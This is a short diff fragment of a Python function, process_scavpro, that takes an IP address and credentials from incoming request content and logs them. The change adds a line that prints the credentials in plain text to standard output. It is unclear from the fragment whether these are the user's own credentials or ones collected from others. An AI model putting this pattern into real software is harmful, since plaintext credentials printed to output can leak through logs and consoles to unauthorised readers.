@@ -41,6 +41,7 @@ def process_scavpro():
     ip = content['IP']
     creds = content['credentials']
     log_creds(ip, creds)
+    print(creds)
     return "Success"
 
 
